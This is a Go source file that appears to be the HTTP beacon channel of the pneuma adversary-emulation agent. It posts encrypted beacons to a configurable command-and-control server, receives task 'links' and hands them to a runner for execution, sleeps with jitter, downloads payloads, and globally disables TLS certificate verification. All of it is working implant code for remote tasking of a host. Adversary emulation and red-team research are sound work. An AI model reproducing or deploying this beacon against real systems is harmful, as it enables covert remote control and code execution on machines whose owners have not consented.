package sockets

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"errors"
	"github.com/preludeorg/pneuma/util"
	"io/ioutil"
	"net/http"
	"net/url"
	"path"
)

var UA *string

type HTTP struct {}

func init() {
	util.CommunicationChannels["http"] = HTTP{}
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	http.DefaultTransport.(*http.Transport).Proxy = http.ProxyFromEnvironment
}

func (contact HTTP) Communicate(agent *util.AgentConfig, beacon util.Beacon) (util.Beacon, error) {
	if _, err := checkValidHTTPTarget(agent.Address); err != nil {
		return beacon, err
	}

	for {
		refreshBeacon(agent, &beacon)
		for agent.Contact == "http" {
			body := beaconPOST(agent.Address, beacon)
			var tempB util.Beacon
			if err := json.Unmarshal(body, &tempB); err != nil || len(tempB.Links) == 0 {
				break
			}
			runLinks(&tempB, &beacon, agent, "")
		}
		if agent.Contact != "http" {
			return beacon, nil
		}
		beacon.Links = beacon.Links[:0]
		jitterSleep(agent.Sleep, "HTTP")
	}
}

func checkValidHTTPTarget(address string) (bool, error) {
	u, err := url.Parse(address)
	if err != nil || u.Scheme == "" || u.Host == "" {
		util.DebugLogf("[%s] is an invalid URL for HTTP/S beacons", address)
		return false, errors.New("INVALID URL")
	}
	return true, nil
}

func requestHTTPPayload(address string) ([]byte, string, int, error) {
	valid, err := checkValidHTTPTarget(address)
	if valid {
		body, _, code, netErr := request(address, "GET", []byte{})
		if netErr != nil {
			return nil, "", code, netErr
		}
		if code == 200 {
			return body, path.Base(address), code, netErr
		}
	}
	return nil, "", 0, err
}

func beaconPOST(address string, beacon util.Beacon) []byte {
	data, _ := json.Marshal(beacon)
	body, _, code, err := request(address, "POST", util.Encrypt(data))
	if len(body) > 0 && code == 200 && err == nil {
		return []byte(util.Decrypt(string(body)))
	}
	return body
}

func request(address string, method string, data []byte) ([]byte, http.Header, int, error) {
	client := &http.Client{}
	req, err := http.NewRequest(method, address, bytes.NewBuffer(data))
	if err != nil {
		util.DebugLog(err)
	}
	req.Close = true
	req.Header.Set("User-Agent", *UA)
	resp, err := client.Do(req)
	if err != nil {
		util.DebugLog(err)
		return nil, nil, 404, err
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		util.DebugLog(err)
		return nil, nil, resp.StatusCode, err
	}
	err = resp.Body.Close()
	if err != nil {
		util.DebugLog(err)
		return nil, nil, resp.StatusCode, err
	}
	return body, resp.Header, resp.StatusCode, err
}
